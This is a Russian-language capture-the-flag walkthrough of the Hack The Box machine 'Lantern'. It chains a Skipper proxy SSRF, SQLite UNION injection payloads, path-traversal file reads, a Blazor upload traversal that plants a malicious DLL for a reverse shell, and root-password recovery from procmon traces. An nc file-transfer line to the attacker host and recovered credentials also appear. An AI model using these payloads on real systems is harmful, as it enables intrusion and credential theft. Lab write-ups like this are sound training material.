<div class="htb-box-info hard">
  <div class="box-header">
    <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d2e8271977fdc3f13bee7d7ab48954ca.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Hard</td></tr>
        <tr><td>Release:</td><td>17 Aug 2024</td></tr>
      </table>
    </div>
  </div>
</div>


# Recon
### nmap
 Начинаем со сканирования открытых портов, используя `nmap`.
```bash
 nmap -p- --min-rate 1000 -v 10.129.231.115
```
![[Pasted image 20260514095636.png]]

Нужно получить больше информации о найденных портах:
```bash
nmap -p 22,80,3000 -sC -sV -vv 10.129.231.115
```

Получаем вывод:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGusUxyRLIhzLUjTy760PsP+hfg8+1NEQLQQfDeDRpoNyzq7OAGHksIqN1Mao6wZ7KRIU9FeeO4j3v1tygt+RgQ=
|   256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN9saUksNH519vji9ytatnGGy+QGBN+u+vur9+/YmVja
80/tcp   open  http    syn-ack ttl 63 Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 14 May 2026 06:57:05 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 14 May 2026 06:57:04 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 14 May 2026 06:57:04 GMT
|_    Server: Skipper Proxy
|_http-server-header: Skipper Proxy
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Lantern
3000/tcp open  http    syn-ack ttl 63 Microsoft Kestrel httpd
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Kestrel
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
...SNIP
```

### Port 80 ( web )
На порту 80 работает какой-то skipper proxy.. Записываем `lantern.htb` в `/etc/hosts` и переходим на веб сайт.

![[Pasted image 20260514095621.png]]

Тут есть форма для отправки резюме. Я пробовал проверить на наличие XSS, но ничего не нашел...
![[Pasted image 20260514095957.png]]

Также на странице `/vacancies` раскрыт стек технологий, используемый организацией.
![[Pasted image 20260514100729.png]]

Вот они:
- Vue.js, jQuery, ExpressJS
- React, Ant, Node.js
- PHP, Symfony, Laravel
- MySQL, PostgreSQL
- RabbitMQ
- ELK
- Redis
- C#, .NET
- Git, CI/CD

### Port 3000 ( web )
Я пробовал найти поддомены или директории, но ничего не нашел... Посмотрим, что имеем на 3000 порту. Видим форму для входа.

![[Pasted image 20260514100800.png]]

Расширение wappalyzer установило, что сайт написан на .Net-е. Используется KestrelHttpServer сервер и какой-то blazor. Код страницы выглядит следующим образом:

![[Pasted image 20260516100841.png]]

Я узнал, что [Blazor](https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor) — это фреймворк .NET или C#, который обрабатывает клиентскую и серверную часть приложения. Еще я заметил, что приложение работает на websocket-ах.

![[Pasted image 20260516101226.png]]

Также в burp-е я заметил, что данные передаются в бинарном формате. Когда я попробовал ввести password, отправилось следующее сообщение:

![[Pasted image 20260516101529.png]]

Также можно подметить, что иногда сервер работает на HTTP.

`ffuf` нашел одну новую страницу, и это `/error`.

![[Pasted image 20260516102006.png]]

# Getting initial access
### Skipper proxy exploit ( SSRF )
Я решил поискать эксплойты для Skipper proxy. Нашел много упоминаний SSRF уязвимости.
![[Pasted image 20260516102411.png]]
![[Pasted image 20260514104418.png]]

> Skipper prior to version v0.13.236 is vulnerable to server-side request forgery (SSRF). An attacker can exploit a vulnerable version of proxy to access the internal metadata server or other unauthenticated URLs by adding an specific header (X-Skipper-Proxy) to the http request.

Мы можем добавить заголовок "X-Skipper-Proxy" в наш запрос, содержащий хост, работающий внутри сервера...

Я попробовал вставить мой IP в заголовок X-Skipper-Proxy. Получил вот такой месседж и подтверждение, что уязвимость присутствует:
![[Pasted image 20260514105329.png]]

### Port fuzz
Я решил найти все локальные порты системы:
```bash
ffuf -u http://lantern.htb -H "X-Skipper-Proxy: http://127.0.0.1:FUZZ" -w <(seq 0 65535) -ac
```
![[Pasted image 20260514110021.png]]
Находим новые 2 порта: 5000 и 8000. На 8000 порту то же, что и на 80 порту. Сделав запрос на 5000 порт, я получил следующий ответ:
```
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1669
Content-Type: text/html
Date: Thu, 14 May 2026 08:00:11 GMT
Etag: "1dae2bf21875e05"
Last-Modified: Tue, 30 Jul 2024 20:29:09 GMT
Server: Skipper Proxy

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>InternaLantern</title>
    <base />
    <script type="text/javascript">
        (function (l) {
            if (l.search[1] === '/') {
                var decoded = l.search.slice(1).split('&').map(function (s) {
                    return s.replace(/~and~/g, '&')
                }).join('?');
                window.history.replaceState(null, null,
                    l.pathname.slice(0, -1) + decoded + l.hash
                );
            }
        }(window.location))
    </script>
    <script>
        var path = window.location.pathname.split('/');
        var base = document.getElementsByTagName('base')[0];
        if (window.location.host.includes('localhost')) {
            base.setAttribute('href', '/');
        } else if (path.length > 2) {
            base.setAttribute('href', '/' + path[1] + '/');
        } else if (path[path.length - 1].length != 0) {
            window.location.replace(window.location.origin + window.location.pathname + '/' + window.location.search);
        }
    </script>
    <link href="css/bootstrap/bootstrap.min.css" rel="stylesheet" />
    <link href="css/app.css" rel="stylesheet" />

</head>

<body>
    <div id="app">Loading...</div>

    <div id="blazor-error-ui">
        An unhandled error has occurred.
        <a href="" class="reload">Reload</a>
        <a class="dismiss">🗙</a>
    </div>

    <script src="_framework/blazor.webassembly.js"></script>
</body>

</html>

```
Очень похож на порт 3000, но есть отличия. 

#### proxy setup
Я хочу посмотреть на эту страницу. Будет загружать ее через SSRF.. Нужно будет добавлять x-skipper-proxy заголовок в каждый запрос. Это можно сделать с помощью burp-а, но я использовал расширение `header editor`.

Добавляем правило со следующими настройками:
![[Pasted image 20260516103927.png]]
Теперь можем открыть страницу, работающую на внутреннем 5000 порту..

### InternalLantern page
#### Enumeration
Видим такую вот страницу. Имеем возможность добавить сотрудника. Я попробовал небольшие пейлоады в эти поля, но ничего интересного не заметил... Также тут почему-то не отображается поле "Additional internal information"...
![[Pasted image 20260514112154.png]]

Также есть такая вот страница. Можем забронировать отпуск какому-то сотруднику.
![[Pasted image 20260516105346.png]]

### SQL Injection
Вводя корректный id всё работает нормально. Я попробовал добавить одну кавычку и увидел возможность... Затем попробовал это:

![[Pasted image 20260514112620.png]]

Также вот так могу:

![[Pasted image 20260514112905.png]]

Нужно вытащить как можно больше полезной информации. Я ввел следующие пейлоады:

* ' UNION select 1,2,sqlite_version(); -> **3.37.2** (версия SQLite)

* ' UNION SELECT 1,group_concat(tbl_name),2 FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%';-- - -> Employees (название основной таблицы)

* ' UNION SELECT 1,sql,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='Employees';-- - -> (столбцы таблицы)

![[Pasted image 20260514114511.png]]

* ' UNION SELECT Id, Name, InternalInfo FROM Employees order by 3;-- -
![[Pasted image 20260514114934.png]]

Видим такую вот критическую информацию:
```
**Name: Travis, Second Name: System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!**
```
Получаем пароль от админки. Сначала я думал, что это пароль от SSH (типо там была приписка #22), но это был пароль от админки на порту 3000.

### Different route
> Также этот пароль можно было достать другим способом. При входе на страницу порта 5000 загружается много разных DLL-ок. Там есть одна интересная — называется она InternaLantern.dll. Надо было её скачать (`curl 'http://lantern.htb/_framework/InternaLantern.dll' -H "X-Skipper-Proxy: http://127.0.0.1:5000" -O InternaLantern.dll`) и, используя такой инструмент как [ilspycmd](https://www.nuget.org/packages/ilspycmd/), декомпилировать (`ilspycmd InternaLantern.dll -o ./decompile/`). Внутри этого кода можно было найти создание тех пользователей, которых мы видели при первом входе на порт 5000. Там и можно было найти пароль от админки... 



### Admin Page ( port 3000 )
#### overview
Перед нами открывается следующая страница:
![[Pasted image 20260514121743.png]]

#### source code ( port 80 )
Слева видим какие-то компоненты: “Files”, “Upload content”, “Health check”, “Logs”,  “Uploaded resumes”. Каждый из них выполняет какую-то функцию. Вот модуль Files. По сути он выводит все файлы из директории `/var/www/siter/lantern.htb`. Тут же я заметил код на Python от страницы, работающей на 80 порту:
![[Pasted image 20260514161826.png]]

Вот полный код:
```python
from flask import Flask, render_template, send_file, request, redirect, json
from werkzeug.utils import secure_filename
import os

app=Flask("__name__")

@app.route('/')
def index():
    if request.headers['Host'] != "lantern.htb":
        return redirect("http://lantern.htb/", code=302)
    return render_template("index.html")

@app.route('/vacancies')
def vacancies():
    return render_template('vacancies.html')

@app.route('/submit', methods=['POST'])
def save_vacancy():
    name = request.form.get('name')
    email = request.form.get('email')
    vacancy = request.form.get('vacancy', default='Middle Frontend Developer')

    if 'resume' in request.files:
        try:
            file = request.files['resume']
            resume_name = file.filename
            if resume_name.endswith('.pdf') or resume_name == '':
                filename = secure_filename(f"resume-{name}-{vacancy}-latern.pdf")
                upload_folder = os.path.join(os.getcwd(), 'uploads')
                destination = '/'.join([upload_folder, filename])
                file.save(destination)
            else:
                return "Only PDF files allowed!"
        except:
            return "Something went wrong!"
    return "Thank you! We will contact you very soon!"

@app.route('/PrivacyAndPolicy')
def sendPolicyAgreement():
    lang = request.args.get('lang')
    file_ext = request.args.get('ext')
    try:
            return send_file(f'/var/www/sites/localisation/{lang}.{file_ext}') 
    except: 
            return send_file(f'/var/www/sites/localisation/default/policy.pdf', 'application/pdf')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8000)
```

### Arbitrary file read
Тут я увидел страницу, которую мне не получилось найти — `/PrivacyAndPolicy`. Она просто загружает какой-то PDF файл. Мы можем передать 2 параметра — `lang` и `file_ext`. И тут я попробовал такой пейлоад для получения доступа к недоступным файлам (path traversal). Можем в параметр lang передать `.`, а в file_ext будет остальное, например `./../../../../../etc/passwd`.

Переходим по такой странице: 
```
http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../etc/passwd 
```

И мы получаем файл:
![[Pasted image 20260514124002.png]]
Пока оставим это. Вернемся к нашей админке.

### FileUpload
У нас также есть возможность загружать файлы. Они сохраняются в папке images на lantern.htb.
![[Pasted image 20260516112950.png]]

Я попробовал переместиться в них по пути и получил это:
![[Pasted image 20260514161436.png]]
Тут видно, что все эти модули находятся в папке `/opt/components`. Также раскрывается пользователь `tomas`.

#### other components
Остальные модули не такие интересные.
Просмотр основного сайта:
![[Pasted image 20260514161753.png]]

Просмотр резюме:
![[Pasted image 20260514161801.png]]

### Arbitrary file write
Также я заметил, что мы не можем загрузить файл, имя которого уже существует... 
![[Pasted image 20260514191416.png]]

#### analyzing fileupload.dll
Я хочу посмотреть как выглядит этот код. Скачиваем FileUpload.dll, перейдя в браузере по:
```
http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../../../../../../../../../opt/components/FileUpload.dll
```

Декомпилируем:
```bash
ilspycmd FileUpload.dll -o ./decompile/
```

Получаем такой вот .NET код:
```C#
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Versioning;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.CompilerServices;
using Microsoft.AspNetCore.Components.Forms;
using Microsoft.AspNetCore.Components.Rendering;
using Microsoft.CodeAnalysis;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
[assembly: TargetFramework(".NETCoreApp,Version=v6.0", FrameworkDisplayName = ".NET 6.0")]
[assembly: AssemblyCompany("FileUpload")]
[assembly: AssemblyConfiguration("Debug")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyInformationalVersion("1.0.0")]
[assembly: AssemblyProduct("FileUpload")]
[assembly: AssemblyTitle("FileUpload")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace Microsoft.CodeAnalysis
{
	[CompilerGenerated]
	[Microsoft.CodeAnalysis.Embedded]
	internal sealed class EmbeddedAttribute : Attribute
	{
	}
}
namespace System.Runtime.CompilerServices
{
	[CompilerGenerated]
	[Microsoft.CodeAnalysis.Embedded]
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)]
	internal sealed class NullableAttribute : Attribute
	{
		public readonly byte[] NullableFlags;

		public NullableAttribute(byte P_0)
		{
			NullableFlags = new byte[1] { P_0 };
		}

		public NullableAttribute(byte[] P_0)
		{
			NullableFlags = P_0;
		}
	}
	[CompilerGenerated]
	[Microsoft.CodeAnalysis.Embedded]
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)]
	internal sealed class NullableContextAttribute : Attribute
	{
		public readonly byte Flag;

		public NullableContextAttribute(byte P_0)
		{
			Flag = P_0;
		}
	}
}
namespace FileUpload
{
	public class _Imports : ComponentBase
	{
		protected override void BuildRenderTree(RenderTreeBuilder __builder)
		{
		}
	}
	public class Component : ComponentBase
	{
		private List<IBrowserFile> loadedFiles = new List<IBrowserFile>();

		private long maxFileSize = 1048576L;

		private int maxAllowedFiles = 10;

		private bool isLoading;

		public bool error;

		public string UIMessage;

		public string UIMessageType;

		protected override void BuildRenderTree(RenderTreeBuilder __builder)
		{
			__builder.OpenElement(0, "span");
			__builder.AddAttribute(1, "class", "border rounded");
			__builder.AddAttribute(2, "style", "border-color:#84878C!important; background:#cdcdcd");
			__builder.AddAttribute(3, "b-10be6f6szn");
			if (error)
			{
				__builder.OpenElement(4, "div");
				__builder.AddAttribute(5, "class", "alert " + UIMessageType);
				__builder.AddAttribute(6, "role", "alert");
				__builder.AddAttribute(7, "b-10be6f6szn");
				__builder.AddContent(8, UIMessage);
				__builder.CloseElement();
			}
			__builder.AddMarkupContent(9, "<p style=\"margin-top: 10px;\" b-10be6f6szn><label b-10be6f6szn>\r\n            Upload directory /var/www/sites/lantern.htb/static/images\r\n    </label></p>\r\n\r\n\r\n<hr b-10be6f6szn>\r\n\r\n");
			__builder.AddMarkupContent(10, "<p b-10be6f6szn><label b-10be6f6szn>\r\n        Upload new customer's avatar:\r\n    </label></p>\r\n\r\n\r\n<hr b-10be6f6szn>\r\n\r\n\r\n");
			__builder.OpenElement(11, "p");
			__builder.AddAttribute(12, "b-10be6f6szn");
			__builder.OpenElement(13, "label");
			__builder.AddAttribute(14, "b-10be6f6szn");
			__builder.OpenComponent<InputFile>(15);
			__builder.AddAttribute(16, "OnChange", Microsoft.AspNetCore.Components.CompilerServices.RuntimeHelpers.TypeCheck(EventCallback.Factory.Create((object)this, (Func<InputFileChangeEventArgs, Task>)LoadFiles)));
			__builder.AddAttribute(17, "multiple", value: true);
			__builder.CloseComponent();
			__builder.CloseElement();
			__builder.CloseElement();
			if (isLoading)
			{
				__builder.AddMarkupContent(18, "<p b-10be6f6szn>Uploading...</p>");
			}
			else
			{
				__builder.OpenElement(19, "ul");
				__builder.AddAttribute(20, "b-10be6f6szn");
				foreach (IBrowserFile loadedFile in loadedFiles)
				{
					__builder.OpenElement(21, "li");
					__builder.AddAttribute(22, "b-10be6f6szn");
					__builder.OpenElement(23, "ul");
					__builder.AddAttribute(24, "b-10be6f6szn");
					__builder.OpenElement(25, "li");
					__builder.AddAttribute(26, "b-10be6f6szn");
					__builder.AddContent(27, "Name: ");
					__builder.AddContent(28, loadedFile.Name);
					__builder.CloseElement();
					__builder.AddMarkupContent(29, "\r\n                    ");
					__builder.OpenElement(30, "li");
					__builder.AddAttribute(31, "b-10be6f6szn");
					__builder.AddContent(32, "Last modified: ");
					__builder.AddContent(33, loadedFile.LastModified.ToString());
					__builder.CloseElement();
					__builder.AddMarkupContent(34, "\r\n                    ");
					__builder.OpenElement(35, "li");
					__builder.AddAttribute(36, "b-10be6f6szn");
					__builder.AddContent(37, "Size (bytes): ");
					__builder.AddContent(38, loadedFile.Size);
					__builder.CloseElement();
					__builder.AddMarkupContent(39, "\r\n                    ");
					__builder.OpenElement(40, "li");
					__builder.AddAttribute(41, "b-10be6f6szn");
					__builder.AddContent(42, "Content type: ");
					__builder.AddContent(43, loadedFile.ContentType);
					__builder.CloseElement();
					__builder.CloseElement();
					__builder.CloseElement();
				}
				__builder.CloseElement();
			}
			__builder.CloseElement();
		}

		private async Task LoadFiles(InputFileChangeEventArgs e)
		{
			isLoading = true;
			loadedFiles.Clear();
			foreach (IBrowserFile file in e.GetMultipleFiles(maxAllowedFiles))
			{
				try      // вот тут уязвимость...
				{
					loadedFiles.Add(file);
					string FileName = file.Name.Replace("\\", "");
					string path = Path.Combine("/var/www/sites/lantern.htb/static/images", FileName);
					if (!isFileExist(FileName))
					{
						await using FileStream fs = new FileStream(path, FileMode.Create);
						await file.OpenReadStream(maxFileSize).CopyToAsync(fs);
						UIMessage = "Success!";
						UIMessageType = "alert-success";
					}
					else
					{
						UIMessage = "An error occured: File already exist";
						UIMessageType = "alert-danger";
					}
				}
				catch (Exception ex)
				{
					UIMessage = "An error occured: " + ex.Message;
					UIMessageType = "alert-danger";
				}
				ShowError();
			}
			isLoading = false;
		}

		public bool isFileExist(string FileName)
		{
			return File.Exists(Path.Combine("/var/www/sites/lantern.htb/static/images", FileName));
		}

		private async Task ShowError()
		{
			error = true;
			await Task.Delay(3000);
			error = false;
			StateHasChanged();
		}
	}
}

```
Тут видно, что нет никакой санитизации имени файла. Код только заменяет обратный слэш. Можно попробовать в имя файла добавить "../" для выбора директории для сохранения.

#### testing payload
Так как весь трафик в бинарном формате, я установил расширение `Blazor Traffic Proccessor` в burp для его декодирования...
![[Pasted image 20260514164230.png]]

Когда отправляешь сообщение в BTP и нажимаешь "Deserialize", получаешь JSON.
![[Pasted image 20260514165752.png]]

Изменим содержимое. 
```json
[{
   "Target": "BeginInvokeDotNetFromJS",
   "Headers": 0,
   "Arguments": [
      "4",
      "null",
      "NotifyChange",
      2,
      [[{
         "blob": {},
         "size": 15,
         "name": "../../../../../../../tmp/test",
         "id": 1,
         "lastModified": "2024-08-21T19:33:58.244Z",
         "contentType": ""
      }]]
   ],
   "MessageType": 1
}]
```

Теперь нужно сериализовать. Получаем это:
```
²À·BeginInvokeDotNetFromJS¡4À¬NotifyChangeÙ[[{"blob":{},"size":11,"name":"../../../../../../../tmp/test","id":3,"lastModified":"2026-05-14T14:06:50.976Z","contentType":""}]]
```

Теперь отпускаем режим перехвата в Burp и файл должен загрузиться в папку /tmp
![[Pasted image 20260514184726.png]]

Можно проверить, перейдя по:
```
http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../../../../../tmp/test
```

Получаем файл...
![[Pasted image 20260514184826.png]]

### Writing malicious razor lib
Так как мы убедились, что имеем возможность записывать файлы, нужно как-то попасть в систему. Надо написать эксплойт на razor class lib...

Создадим новый шаблон:
```bash
dotnet new razorclasslib -o LanternExploit -f net6.0
```

Открываем в редакторе. Видим следующую структуру:
![[Pasted image 20260516154455.png]]

Для начала нужно попробовать просто загрузить эксплойт. Собираем:
```bash
dotnet build LanternExploit --configuration Release
```
Получаем LanternExploit.dll

Теперь нужно загрузить в папку `/opt/components`:
![[Pasted image 20260514193626.png]]

Тут мы получаем ошибку. LanternAdmin.dll не может найти component.
![[Pasted image 20260514194457.png]]

Я декомпилировал наш DLL эксплойт.
```C#
public class Component1 : ComponentBase
{
	protected override void BuildRenderTree(RenderTreeBuilder __builder)
		{
			__builder.AddMarkupContent(0, "<div class=\"my-component\" b-n6y29gm2i9>\r\n This component is defined in the <strong b-n6y29gm2i9>LanternExploit</strong> library.\r\n</div>");
		}
}
```
Имеем класс Component1. Скорее всего название такое же как и у .razor файла..

Переименуем Component1.razor на Component.razor... Я опять собрал это всё. DLL-ка была успешно загружена. Теперь нам нужно написать основную часть...

#### getting reverse shell
С помощью моей любимой большой языковой модели мне удалось что-то создать. Нужно переписать функцию `OnInitialized` для получения соединения...
![[Pasted image 20260516154904.png]]
Нужно опять все собрать и можно загружать.

Выбираем наш модуль и получаем reverse shell соединение...
![[Pasted image 20260514195826.png]]

Достаем первый флаг.
![[Pasted image 20260514195950.png]]

# Privilege Escalation
#### ssh connection
Я решил найти SSH ключи для стабильного подключения:
![[Pasted image 20260514200846.png]]

Копируем этот ключ.
![[Pasted image 20260514200917.png]]

На нашей системе создаем файл `id_rsa`. Нужно выдать ему права `chmod 600 id_rsa`. Теперь можно подключаться:
![[Pasted image 20260514200831.png]]

### Enumeration
Я проверил какие процессы запускались и увидел интересную строчку. Мб пригодиться позже...
```
root        3721  0.0  0.1  17496  4916 ?        Ssl  16:50   0:00 /usr/bin/expect -f /root/bot.exp
root        3722  0.0  0.1   7272  4044 pts/0    Ss+  16:50   0:00 nano /root/automation.sh
```

### Procmon
Недолго думая, я решил посмотреть, что мы можем запускать как `root`. Это программа [procmon](https://github.com/microsoft/ProcMon-for-Linux). По сути она служит для мониторинга и отслеживания системных вызовов и всё такое...
```
sudo -l
Matching Defaults entries for tomas on lantern:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomas may run the following commands on lantern:
    (ALL : ALL) NOPASSWD: /usr/bin/procmon
```

Программа имеет следующие опции:
![[Pasted image 20260515081015.png]]

Запускаем ее:
![[Pasted image 20260514211427.png]]

Мы видим разные системные вызовы. Нас интересуют `write` события, поэтому запускаем с опцией `-e write`. Также из вывода команды `ps aux` мы узнали, что root открывал automation.sh при помощи `nano`. Поэтому будем брать только PID этого процесса: `-p $(pidof nano)`.
![[Pasted image 20260515092312.png]]

### Analyzing db ouput
Дадим проге поработать минут 5, и можно будет сохранять файл для дальнейшего анализа.
Отправим БД файл на нашу систему:

На своем терминале я пишу:
```bash
nc -lvnp 4444 > catch.db   
listening on [any] 4444 ...
connect to [10.10.15.42] from (UNKNOWN) [10.129.231.115] 32964
```

Затем сразу отправляем этот файл с захваченной системы:
```bash
nc 10.10.15.42 4444 < procmon_2026-05-15_05:26:26.db
```

Проверим, что файл цел:
```bash
file catch.db  
```

OUTPUT:
```
catch.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 252, cookie 0x2, schema 4, UTF-8, version-valid-for 2
```

Открыв эту БД в дефолтном редакторе, видим следующие таблицы с их столбцами:
![[Pasted image 20260515083442.png]]
Тут самая интересная таблица это `ebpf`, конкретнее столбец `arguments`.

### Getting root passwd
Этот столбец просто так не виден, т.к. это бинарные данные... Надо выводить в hex формате:
![[Pasted image 20260515084754.png]]
В этом столбце нам нужно как-то выводить байты `buf` (буфер). Я заметил, что его длина зависит от `resultcode`. Поэтому будем скипать строки где resultcode = 0. Тут нужно написать скрипт для декодирования нужных строк:

```python
import sqlite3

conn = sqlite3.connect('catch3.db')
cursor = conn.cursor()

cursor.execute("SELECT * from ebpf;")
rows = cursor.fetchall()

for row in rows:
    res = int(row[4])
    args = row[-1]
    if res == 0:
        continue
   
    buffer = args[8:8+res]
    
    if buffer[0:3] == b'\xf72a':
        continue
    
    print(buffer.decode().replace('\r','\n'), end='')

```
Функция проходит по строкам. Если функция записи возвращает сообщение о том, что были записаны какие-либо байты, она получает это количество байтов из аргументов и выводит их. Там есть несколько символов \r для сброса курсора в начало строки, и я заменяю их на символ новой строки, чтобы это было видно.

В начале я получал вот это...

![[Pasted image 20260515092154.png]]

Но я вообще не понял этот момент... Я запускал этот код несколько раз, и в один момент я получил новый вывод. Хотя файл был одним и тем же... Непонятно короче...

![[Pasted image 20260515092249.png]]

Мы видим, что пароль передается для запуска /backup.sh. Еще символы выводятся по 2 раза... Учтя это, получаем пароль `Q3Eddtdw3pMB`. 

Получаем финальный флаг.

![[Pasted image 20260515092632.png]]
